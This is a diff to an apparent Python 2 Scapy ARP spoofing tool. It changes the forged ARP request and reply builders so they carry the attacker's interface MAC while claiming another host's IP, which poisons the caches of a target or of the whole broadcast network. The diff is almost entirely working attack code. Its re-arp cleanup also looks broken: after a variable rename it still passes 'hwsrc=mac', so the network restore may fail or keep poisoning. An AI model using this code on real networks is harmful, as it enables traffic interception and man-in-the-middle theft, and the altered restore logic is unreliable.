@@ -23,27 +23,29 @@ if len(args) != 1 or options.interface == None:
 	sys.exit(0)
 
 def build_req():
+	mac = get_if_hwaddr(options.interface)
 	if options.target == None:
-		pkt = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(psrc=args[0], pdst=args[0])
+		pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=mac, psrc=args[0], pdst=args[0])
 	elif options.target:
 		target_mac = getmacbyip(options.target)
 		if target_mac == None:
 			print "[-] Error: Could not resolve targets MAC address"
 			sys.exit(1)
-		pkt = Ether(dst=target_mac)/ARP(psrc=args[0], hwdst = target_mac, pdst=options.target)
+		pkt = Ether(src=mac, dst=target_mac)/ARP(hwsrc=mac, psrc=args[0], hwdst = target_mac, pdst=options.target)
 		
 	return pkt
 
 
 def build_rep():
+	mac = get_if_hwaddr(options.interface)
 	if options.target == None:
-		pkt = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(psrc=args[0], op=2)
+		pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=mac, psrc=args[0], op=2)
 	elif options.target:
 		target_mac = getmacbyip(options.target)
 		if target_mac == None:
 			print "[-] Error: Could not resolve targets MAC address"
 			sys.exit(1)
-		pkt = Ether(dst=target_mac)/ARP(psrc=args[0], hwdst=target_mac, pdst=options.target, op=2)
+		pkt = Ether(src=mac, dst=target_mac)/ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, pdst=options.target, op=2)
 
 	return pkt
 
@@ -51,8 +53,8 @@ def build_rep():
 def rearp(signal, frame):
 	sleep(1)
 	print '\n[*] Re-arping network'
-	mac = getmacbyip(args[0])
-	pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff')/ARP(psrc=args[0], hwsrc=mac, op=2)
+	rearp_mac = getmacbyip(args[0])
+	pkt = Ether(src=rearp_mac, dst='ff:ff:ff:ff:ff:ff')/ARP(psrc=args[0], hwsrc=mac, op=2)
 	sendp(pkt, inter=1, count=5, iface=options.interface)
 	sys.exit(0)
 
